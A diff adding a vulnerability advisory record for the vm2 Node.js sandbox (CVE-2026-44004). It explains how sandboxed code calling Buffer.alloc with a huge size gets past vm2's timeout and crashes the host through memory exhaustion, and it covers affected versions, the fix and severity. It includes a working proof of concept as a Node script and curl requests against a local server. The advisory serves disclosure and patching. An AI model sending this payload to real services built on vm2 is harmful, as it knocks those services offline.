@@ -1,0 +1,181 @@
+advisory_id: GHSA-6785-pvv7-mvg7
+datasource_id: github_osv/GHSA-6785-pvv7-mvg7
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-6785-pvv7-mvg7/GHSA-6785-pvv7-mvg7.json
+aliases:
+  - CVE-2026-44004
+summary: |
+  vm2 Sandbox Access to Host Buffer.alloc Allows timeout Bypass Resulting in Memory Exhaustion
+  ### Summary
+  Sandboxed code can call `Buffer.alloc()` with an arbitrary size to allocate memory directly on the host heap. Because `Buffer.alloc` is a synchronous C++ native call, vm2's `timeout` option cannot interrupt it. A single request can exhaust host memory and crash the process with a `FATAL ERROR: Reached heap limit`.
+
+  ### Details
+  In `lib/vm.js:58`, `Buffer` is exposed to the sandbox through the `HOST` object. The bridge proxy (`lib/bridge.js`) passes `Buffer.alloc()` calls to the host without any size validation.
+
+  Key technical distinction from regular JavaScript memory exhaustion (e.g., `while(true) a.push(...)`):
+  - **JavaScript loops**: V8 can interrupt via timeout — vm2's `timeout` option works
+  - **`Buffer.alloc(N)`**: Executes as a single synchronous C++ call — V8 timeout has no opportunity to interrupt
+
+  This means:
+  1. `timeout: 5000` does NOT protect against this attack
+  2. A single call allocates the entire requested size at once
+  3. In memory-constrained environments (Docker, Lambda, Kubernetes pods), this causes immediate OOM crash
+
+  Tested amplification factor: ~100 bytes HTTP request — 1,000,000:1 or greater (100 bytes request to 100MB+ host heap allocation).
+
+  ### PoC
+
+  **Library-level PoC (Node.js script — primary):**
+  ```javascript
+  const { VM } = require("vm2");
+  const vm = new VM({ timeout: 5000 });
+
+  // Buffer.alloc bypasses timeout — allocates 100MB on host heap
+  const result = vm.run(`Buffer.alloc(1024*1024*100).length`);
+  console.log(result); // 104857600 — timeout had no effect
+
+  // Control test — JavaScript loop IS caught by timeout
+  try {
+    vm.run(`var a=[]; while(true) a.push(1)`);
+  } catch(e) {
+    console.log(e.message); // "Script execution timed out after 5000ms"
+  }
+  ```
+
+  **HTTP demonstration (OOM crash):**
+  ```bash
+  # 1. Confirm server is running
+  curl -s http://localhost:3000/api/execute \
+    -X POST -H "Content-Type: application/json" \
+    -d '{"code":"\"alive\""}'
+  # => {"result":"\"alive\""}
+
+  # 2. Send Buffer.alloc payload — process crashes with OOM
+  curl -s -X POST http://localhost:3000/api/execute \
+    -H "Content-Type: application/json" \
+    -d '{"code":"Buffer.alloc(1024*1024*100).length"}'
+  # => empty response (process died)
+
+  # 3. Check server logs:
+  # FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory
+
+  # Control test — JavaScript loop IS caught by timeout:
+  curl -s -X POST http://localhost:3000/api/execute \
+    -H "Content-Type: application/json" \
+    -d '{"code":"var a=[]; while(true) a.push(1)"}'
+  # => {"errors":["Script execution timed out after 5000ms"]}
+  # Server stays alive — timeout works for JS, but NOT for Buffer.alloc
+  ```
+
+  ### Impact
+  - **DoS**: A single HTTP request crashes the host Node.js process via OOM. The `timeout` option provides no protection.
+  - **Environment-dependent severity**:
+    - **Memory-constrained environments** (Docker with memory limits, Kubernetes pods, Lambda): The allocation exceeds the memory limit, causing immediate process termination via OOM. This is the primary threat scenario — `FATAL ERROR: Reached heap limit` was confirmed in testing.
+    - **Unconstrained environments**: The allocation succeeds and memory is reclaimed by GC after the request completes, resulting in temporary performance degradation rather than a crash.
+  - **Scope**: All applications using vm2. Default configuration is vulnerable. Memory-constrained environments (Docker, Kubernetes, Lambda) are most severely impacted.
+impacted_packages:
+  - purl: pkg:npm/vm2
+    affected_versions: vers:npm/<=3.10.5
+    fixed_versions: vers:npm/3.11.0
+    affected_packages:
+      - pkg:npm/vm2@0.1.0
+      - pkg:npm/vm2@0.1.1
+      - pkg:npm/vm2@0.2.0
+      - pkg:npm/vm2@0.2.1
+      - pkg:npm/vm2@0.2.2
+      - pkg:npm/vm2@0.2.3
+      - pkg:npm/vm2@0.2.4
+      - pkg:npm/vm2@1.0.0
+      - pkg:npm/vm2@1.0.1
+      - pkg:npm/vm2@2.0.0
+      - pkg:npm/vm2@2.0.2
+      - pkg:npm/vm2@3.0.0
+      - pkg:npm/vm2@3.0.1
+      - pkg:npm/vm2@3.1.0
+      - pkg:npm/vm2@3.2.0
+      - pkg:npm/vm2@3.3.0
+      - pkg:npm/vm2@3.3.1
+      - pkg:npm/vm2@3.4.0
+      - pkg:npm/vm2@3.4.1
+      - pkg:npm/vm2@3.4.2
+      - pkg:npm/vm2@3.4.3
+      - pkg:npm/vm2@3.4.4
+      - pkg:npm/vm2@3.4.5
+      - pkg:npm/vm2@3.4.6
+      - pkg:npm/vm2@3.5.0
+      - pkg:npm/vm2@3.5.1
+      - pkg:npm/vm2@3.5.2
+      - pkg:npm/vm2@3.6.0
+      - pkg:npm/vm2@3.6.1
+      - pkg:npm/vm2@3.6.2
+      - pkg:npm/vm2@3.6.3
+      - pkg:npm/vm2@3.6.4
+      - pkg:npm/vm2@3.6.5
+      - pkg:npm/vm2@3.6.6
+      - pkg:npm/vm2@3.6.7
+      - pkg:npm/vm2@3.6.8
+      - pkg:npm/vm2@3.6.9
+      - pkg:npm/vm2@3.6.10
+      - pkg:npm/vm2@3.6.11
+      - pkg:npm/vm2@3.7.0
+      - pkg:npm/vm2@3.8.0
+      - pkg:npm/vm2@3.8.1
+      - pkg:npm/vm2@3.8.2
+      - pkg:npm/vm2@3.8.3
+      - pkg:npm/vm2@3.8.4
+      - pkg:npm/vm2@3.9.0
+      - pkg:npm/vm2@3.9.1
+      - pkg:npm/vm2@3.9.2
+      - pkg:npm/vm2@3.9.3
+      - pkg:npm/vm2@3.9.4
+      - pkg:npm/vm2@3.9.5
+      - pkg:npm/vm2@3.9.6
+      - pkg:npm/vm2@3.9.7
+      - pkg:npm/vm2@3.9.8
+      - pkg:npm/vm2@3.9.9
+      - pkg:npm/vm2@3.9.10
+      - pkg:npm/vm2@3.9.11
+      - pkg:npm/vm2@3.9.12
+      - pkg:npm/vm2@3.9.13
+      - pkg:npm/vm2@3.9.14
+      - pkg:npm/vm2@3.9.15
+      - pkg:npm/vm2@3.9.16
+      - pkg:npm/vm2@3.9.17
+      - pkg:npm/vm2@3.9.18
+      - pkg:npm/vm2@3.9.19
+      - pkg:npm/vm2@3.10.0
+      - pkg:npm/vm2@3.10.1
+      - pkg:npm/vm2@3.10.2
+      - pkg:npm/vm2@3.10.3
+      - pkg:npm/vm2@3.10.4
+      - pkg:npm/vm2@3.10.5
+    fixed_packages:
+      - pkg:npm/vm2@3.11.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-6785-pvv7-mvg7/GHSA-6785-pvv7-mvg7.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-770
+references:
+  - url: https://github.com/patriksimek/vm2
+    reference_type:
+    reference_id:
+  - url: https://github.com/patriksimek/vm2/releases/tag/v3.11.0
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-44004
+    reference_type:
+    reference_id: CVE-2026-44004
+  - url: https://github.com/patriksimek/vm2/security/advisories/GHSA-6785-pvv7-mvg7
+    reference_type:
+    reference_id: GHSA-6785-pvv7-mvg7
+exploits: []
